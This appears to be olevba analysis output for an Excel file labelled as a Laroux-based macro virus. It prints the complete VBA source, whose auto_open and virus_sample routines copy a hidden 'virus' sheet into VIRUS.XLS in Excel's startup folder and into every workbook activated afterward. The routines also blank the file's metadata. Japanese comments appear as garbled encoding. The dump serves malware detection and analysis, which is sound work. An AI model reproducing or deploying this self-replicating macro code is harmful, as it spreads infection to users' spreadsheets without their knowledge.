olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-e26e8483cd5d63e863aba16519cf8abc8cd5dc96
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO virus.bas 
in file: Virus.MSExcel.Laroux-based-e26e8483cd5d63e863aba16519cf8abc8cd5dc96 - OLE stream: '_VBA_PROJECT_CUR/VBA/virus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
' virus sample ƒ}ƒNƒ�
' Ï¸Û‹L˜^“ú : 1997/9/10  Õ°»Þ°–¼ : ƒVƒXƒeƒ€ƒtƒ@ƒCƒu�iŠ”�j
'
'
Sub auto_open()
Attribute auto_open.VB_Description = "Ï¸Û‹L˜^“ú : 1997/9/10  Õ°»Þ°–¼ : ƒVƒXƒeƒ€ƒtƒ@ƒCƒu�iŠ”�j"
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "virus_sample"
    'MsgBox ActiveWorkbook.Name & "!auto_open(�I—¹)"
End Sub

Sub virus_sample()
Attribute virus_sample.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "VIRUS.XLS")
    If m$ = "VIRUS.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    virus_flag = p + w * 10
    
    Select Case virus_flag
        Case 10
            'MsgBox ActiveWorkbook.Name & ": Case 10"
            Application.ScreenUpdating = False
            n4$ = ActiveWorkbook.Name
            Sheets("virus").Visible = True
            Sheets("virus").Select
            Sheets("virus").Copy
            With ActiveWorkbook
                .Title = ""
                .Subject = ""
                .Author = ""
                .Keywords = ""
                .Comments = ""
            End With
            newname$ = ActiveWorkbook.Name
            c4$ = CurDir()
            ChDir Application.StartupPath
            ActiveWindow.Visible = False
            Workbooks(newname$).SaveAs _
                Filename:=Application.StartupPath & "/" & "VIRUS.XLS", _
                FileFormat:=xlNormal, _
                Password:="", _
                WriteResPassword:="", _
                ReadOnlyRecommended:=False, _
                CreateBackup:=False
            ChDir c4$
            Workbooks(n4$).Sheets("virus").Visible = False
            Application.OnSheetActivate = ""
            Application.ScreenUpdating = True
            Application.OnSheetActivate = "virus.xls!virus_sample"
        Case 1
            'MsgBox ActiveWorkbook.Name & ": Case 1"
            Application.ScreenUpdating = False
            n4$ = ActiveWorkbook.Name
            p4$ = ActiveWorkbook.Path
            s$ = Workbooks(n4$).Sheets(1).Name
            If s$ <> "virus" Then
                Workbooks("VIRUS.XLS").Sheets("virus").Copy before:=Workbooks(n4$).Sheets(1)
                Workbooks(n4$).Sheets("virus").Visible = False
            Else
            End If
            Application.OnSheetActivate = ""
            Application.ScreenUpdating = True
            Application.OnSheetActivate = "virus.xls!virus_sample"
        Case Else
            'MsgBox ActiveWorkbook.Name & ": Case Else"
    End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  viru
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

